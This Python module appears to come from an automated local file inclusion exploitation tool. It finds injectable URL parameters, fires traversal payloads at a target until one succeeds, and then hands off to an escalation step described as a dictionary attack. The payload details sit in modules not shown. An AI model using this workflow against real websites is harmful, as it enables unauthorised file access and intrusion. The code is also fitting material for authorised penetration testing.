from .prints import prints
from .setup_url import SetupURL
from .exploit_lfi import SetupExploit
from .escalate import Escalate
from .common import get_number


class TestSingle:
    """Controls the control flow of the single target testing"""
    def __init__(self, cmd_args):
        """
        :param cmd_args: Command line arguments
        """
        self.url = cmd_args.url
        self.local_file = cmd_args.local_file
        self.search_term = cmd_args.search_term
        self.max_tran_depth = cmd_args.max_depth
        self.setup_url = SetupURL(cmd_args)
        self.crab_request = cmd_args.send
        self.payloads = []
        self.tokenized_urls = []
        self.thread_count = cmd_args.thread
        self.execute_all_payloads = False
        self.successful_payload = False
        self.successful_url = False

    def start(self):
        prints(f"Beginning testing on {self.url}", "bold")
        # Check that the URL can be parsed
        if not self.parse():
            return False

        # Check that the host is up
        prints("Testing connection", "bold")
        if not self.test_con():
            return False

        # Find all injectable parameters
        prints("Finding injection points", "bold")
        prints("Parameter to test:")
        if not self.find_injection_points():
            return False

        # Generate payloads and inject them into parameters
        prints("Generating Payloads", "bold")
        # Get testable parameters
        self.setup_url.test_parameter()
        self.prepared_urls = self.setup_url.get_tokenized_objects()
        self.start_exploit()
        if not self.successful_payload or not self.successful_url:
            return False

        # At this point we have found at least one successful exploit
        # We can now perform a dictionary attack
        esc = Escalate(self.successful_url, self.successful_payload, self.crab_request)

    def parse(self):
        if not self.setup_url.parse():
            prints(f"Finishing testing on {self.url}", "error")
            prints(f"Reason: Failed to parse URL", "error")
            return False
        return True

    def test_con(self):
        if not self.setup_url.is_target_online():
            prints(f"Finishing testing on {self.url}", "error")
            prints(f"Reason: Failed to connect", "error")
            return False
        return True

    def find_injection_points(self):
        self.setup_url.find_injection_points()
        if len(self.setup_url.get_parameters()) == 0:
            prints(f"No testable parameters found")
            return False
        return True

    def start_exploit(self):
        ready_to_escilate = False
        # For parameters in the url
        for url in self.prepared_urls:
            if ready_to_escilate:
                break
            prints("")
            prints(f"Testing Parameter:\t{url.parameter_name}", "bold")
            # Create a payload list and loop through it
            self.payloads = self.setup_url.get_payload_list(self.local_file, self.search_term, self.max_tran_depth)
            for pay in self.payloads:
                exploit = SetupExploit(self.crab_request, pay, url)
                exploit.send_exploit()
                # If the payload was successful
                if exploit.get_payload_status():
                    self.successful_payload = exploit

                    self.successful_url = url
                    ready_to_escilate = True
                    break

